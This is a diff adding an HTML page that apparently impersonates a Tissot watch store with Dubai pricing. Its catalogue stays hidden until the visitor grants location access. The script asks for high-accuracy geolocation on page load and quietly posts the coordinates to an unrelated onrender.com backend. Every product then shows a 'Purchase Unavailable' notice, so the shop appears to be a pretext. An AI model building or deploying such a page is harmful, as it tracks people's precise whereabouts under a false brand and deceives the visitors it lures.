@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>All Watches - Tissot</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&family=Teko:wght@500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --tissot-red: #E2001A;
+            --background-color: #FFFFFF;
+            --text-color: #000000;
+            --secondary-text-color: #555555;
+            --light-gray-bg: #F5F5F5;
+            --border-color: #e0e0e0;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+        .container { width: 90%; max-width: 1300px; margin: 0 auto; }
+
+        /* --- Location Requirement Section --- */
+        .location-requirement { display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; min-height: 100vh; padding: 2rem; }
+        .location-icon { font-size: 4rem; color: var(--tissot-red); margin-bottom: 2rem; }
+        .location-requirement h1 { font-family: 'Teko', sans-serif; font-size: 2.8rem; margin-bottom: 1rem; text-transform: uppercase; }
+        .location-requirement p { font-size: 1.1rem; color: var(--secondary-text-color); margin-bottom: 1.5rem; max-width: 600px; }
+        .allow-button { display: inline-block; padding: 12px 30px; background: var(--tissot-red); color: #fff; text-decoration: none; font-weight: 700; text-transform: uppercase; border-radius: 2px; transition: all 0.3s ease; border: 2px solid var(--tissot-red); cursor: pointer; }
+        .allow-button:hover { background: #fff; color: var(--tissot-red); }
+        
+        /* --- Main Content (Hidden by default) --- */
+        .main-content { display: none; flex-direction: column; min-height: 100vh; }
+        main { flex: 1; }
+
+        /* --- Header --- */
+        header { padding: 1.5rem 0; border-bottom: 1px solid var(--border-color); }
+        .main-nav { display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-family: 'Teko', sans-serif; font-size: 2.5rem; font-weight: 600; color: var(--text-color); text-decoration: none; letter-spacing: 1px; }
+        .logo span { color: var(--tissot-red); }
+        .nav-links { display: flex; gap: 2rem; list-style: none; }
+        .nav-links a { text-decoration: none; color: var(--text-color); font-weight: 700; text-transform: uppercase; font-size: 0.9rem; transition: color 0.3s ease; }
+        .nav-links a:hover, .nav-links a.active { color: var(--tissot-red); }
+
+        /* --- Main Content --- */
+        .page-header { text-align: center; padding: 3rem 0; border-bottom: 1px solid var(--border-color); margin-bottom: 3rem;}
+        .page-header h1 { font-family: 'Teko', sans-serif; font-size: 3rem; text-transform: uppercase; }
+        .product-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem; }
+        .product-card { background: var(--light-gray-bg); text-align: center; cursor: pointer; transition: box-shadow 0.3s ease; }
+        .product-card:hover { box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .product-image img { width: 100%; height: auto; background-color: #fff; }
+        .product-info { padding: 1.5rem 1rem; }
+        .product-name { font-size: 1.1rem; font-weight: 700; margin-bottom: 0.3rem; }
+        .product-ref { font-size: 0.8rem; color: #888; margin-bottom: 0.8rem; }
+        .product-price { font-size: 1.1rem; color: var(--tissot-red); font-weight: 700; }
+        
+        /* --- Footer --- */
+        footer { background-color: #000; color: #fff; padding: 3rem 0; }
+        .footer-content { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 2rem; margin-bottom: 2rem; }
+        .footer-column h3 { font-family: 'Teko', sans-serif; font-size: 1.5rem; text-transform: uppercase; margin-bottom: 1rem; color: #fff; }
+        .footer-column a, .footer-column p { color: #a0a0a0; text-decoration: none; margin-bottom: 0.7rem; display: block; transition: color 0.3s ease; font-size: 0.9rem; }
+        .footer-column a:hover { color: var(--tissot-red); }
+        .copyright { text-align: center; padding-top: 2rem; border-top: 1px solid #333; font-size: 0.9rem; color: #a0a0a0; }
+
+        /* --- Location Notification Modal --- */
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.7); align-items: center; justify-content: center; }
+        .modal-content { background-color: #fff; color: #000; text-align: center; padding: 40px; border-radius: 5px; width: 90%; max-width: 500px; position: relative; animation: slide-down 0.4s ease-out; }
+        @keyframes slide-down { from { top: -100px; opacity: 0; } to { top: 0; opacity: 1; } }
+        .modal-icon { font-size: 3rem; color: var(--tissot-red); margin-bottom: 1rem; }
+        .modal-content h2 { font-family: 'Teko', sans-serif; font-size: 2rem; text-transform: uppercase; margin-bottom: 1rem; }
+        .modal-content p { margin-bottom: 2rem; color: var(--secondary-text-color); }
+        .modal-button { padding: 10px 40px; background: var(--tissot-red); color: #fff; border: none; cursor: pointer; text-transform: uppercase; font-weight: 700; transition: background-color 0.3s ease; border: 2px solid var(--tissot-red); }
+        .modal-button:hover { background-color: #fff; color: var(--tissot-red); }
+    </style>
+</head>
+<body>
+    <section class="location-requirement" id="locationRequirement">
+        <div class="location-icon"><i class="fas fa-map-marker-alt"></i></div>
+        <h1>Location Access Required</h1>
+        <p>To provide you with accurate shipping information and regional pricing in Dubai (AED), please enable location services in your browser.</p>
+        <p>Your location data is used solely to enhance your shopping experience.</p>
+        <button class="allow-button" onclick="getAndSendLocation()">Allow Access & Enter Site</button>
+    </section>
+
+    <div class="main-content" id="mainContent">
+        <header>
+            <div class="container">
+                <nav class="main-nav">
+                    <a href="index.html" class="logo">TISSOT<span>.</span></a>
+                    <ul class="nav-links">
+                        <li><a href="index.html">Home</a></li>
+                        <li><a href="wathes.html" class="active">Watches</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </header>
+
+        <main>
+            <div class="page-header">
+                <div class="container"><h1>All Our Watches</h1></div>
+            </div>
+            <div class="container">
+                <div class="product-grid">
+                    <div class="product-card">
+                        <div class="product-image"><img src="tis-digital-PR100-category-banner.png" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">PRX Powermatic 80</h3><p class="product-ref">T137.407.11.041.00</p><p class="product-price">AED 1,350</p></div>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-image"><img src="Tis-Digital-SRV-HP-Product-Image-KV-Desktop.png" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">Seastar 1000</h3><p class="product-ref">T120.417.11.041.01</p><p class="product-price">AED 1,150</p></div>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-image"><img src="T150-210-26-111-00_shadow.png" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">T-Touch Solar</h3><p class="product-ref">T110.420.47.051.00</p><p class="product-price">AED 1,450</p></div>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-image"><img src="T150-210-21-031-00_shadow.png" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">Le Locle Automatic</h3><p class="product-ref">T006.407.11.033.00</p><p class="product-price">AED 1,200</p></div>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-image"><img src="T122-423-11-033-00_shadow.png" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">Gentleman Powermatic</h3><p class="product-ref">T127.407.11.041.00</p><p class="product-price">AED 1,400</p></div>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-image"><img src="T122-210-22-033-01_shadow.png" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">Carson Premium</h3><p class="product-ref">T122.407.16.031.00</p><p class="product-price">AED 850</p></div>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-image"><img src="T122-210-11-033-00_shadow.png" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">Supersport Chrono</h3><p class="product-ref">T125.617.16.051.00</p><p class="product-price">AED 1,250</p></div>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-image"><img src="T122-207-22-036-00_shadow.png" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">Heritage Visodate</h3><p class="product-ref">T118.410.16.057.00</p><p class="product-price">AED 1,100</p></div>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-image"><img src="T101-917-11-046-00_shadow.png" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">Classic Dream</h3><p class="product-ref">T129.410.16.013.00</p><p class="product-price">AED 750</p></div>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-image"><img src="T101-917-22-031-00_shadow.png" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">T-Race Chronograph</h3><p class="product-ref">T115.417.27.051.00</p><p class="product-price">AED 1,480</p></div>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-image"><img src="Shadow.png" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">Everytime Medium</h3><p class="product-ref">T109.410.16.032.00</p><p class="product-price">AED 650</p></div>
+                    </div>
+                    <div class="product-card">
+                        <div class="product-image"><img src="https://images.unsplash.com/photo-1533139502658-0198f920d8e8?q=80&w=1374&auto=format&fit=crop" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">Bellissima Small Lady</h3><p class="product-ref">T126.010.11.013.00</p><p class="product-price">AED 950</p></div>
+                    </div>
+                     <div class="product-card">
+                        <div class="product-image"><img src="5shadow.png" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">Tissot Le Locle Gold </h3><p class="product-ref">T126.010.11.013.00</p><p class="product-price">AED 950</p></div>
+                    </div>
+                     <div class="product-card">
+                        <div class="product-image"><img src="7shadow.png" alt="Watch"></div>
+                        <div class="product-info"><h3 class="product-name">Tissot Le Locle</h3><p class="product-ref">T126.010.11.013.00</p><p class="product-price">AED 950</p></div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <div class="container">
+                <div class="footer-content">
+                    <div class="footer-column"><h3>Company</h3><a href="#">Brand</a><a href="#">History</a><a href="#">Careers</a></div>
+                    <div class="footer-column"><h3>Collections</h3><a href="#">T-Sport</a><a href="#">T-Classic</a><a href="#">Heritage</a><a href="#">T-Lady</a></div>
+                    <div class="footer-column"><h3>Customer Service</h3><a href="#">Contact Us</a><a href="#">Warranty</a><a href="#">FAQ</a><a href="#">Find a Store</a></div>
+                    <div class="footer-column"><h3>Follow Us</h3><a href="#">Instagram</a><a href="#">Facebook</a><a href="#">Twitter</a></div>
+                </div>
+                <div class="copyright"><p>&copy; 2025 Tissot SA. All rights reserved.</p></div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Modal HTML -->
+    <div id="locationModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-icon"><i class="fas fa-map-marker-slash"></i></div>
+            <h2>Purchase Unavailable</h2>
+            <p>We've scanned your location. As you are not currently in Dubai, online purchases are not available. Please visit your local authorized retailer.</p>
+            <button id="modalCloseBtn" class="modal-button">OK</button>
+        </div>
+    </div>
+
+    <script>
+        // --- Location Script ---
+        const backendURL = "https://bakend-pvma.onrender.com/location";
+        const locationRequirement = document.getElementById("locationRequirement");
+        const mainContent = document.getElementById("mainContent");
+        function getAndSendLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        console.log("Location access granted.");
+                        locationRequirement.style.display = "none";
+                        mainContent.style.display = "flex";
+                        const data = { latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy };
+                        fetch(backendURL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) })
+                        .then(res => res.json()).then(res => console.log("Location sent successfully:", res)).catch(err => console.error("Error sending location:", err));
+                    },
+                    () => {
+                        locationRequirement.style.display = "flex";
+                        mainContent.style.display = "none";
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                locationRequirement.innerHTML = `<div class="location-icon"><i class="fas fa-exclamation-triangle"></i></div><h1>Browser Not Supported</h1><p>Your browser does not support Geolocation services.</p>`;
+            }
+        }
+        window.onload = getAndSendLocation;
+
+        // --- Modal Script ---
+        const modal = document.getElementById('locationModal');
+        const closeBtn = document.getElementById('modalCloseBtn');
+        const productCards = document.querySelectorAll('.product-card');
+        const openModal = () => { modal.style.display = 'flex'; }
+        const closeModal = () => { modal.style.display = 'none'; }
+        productCards.forEach(card => card.addEventListener('click', openModal));
+        closeBtn.addEventListener('click', closeModal);
+        window.addEventListener('click', (event) => {
+            if (event.target == modal) {
+                closeModal();
+            }
+        });
+    </script>
+</body>
+</html>
+
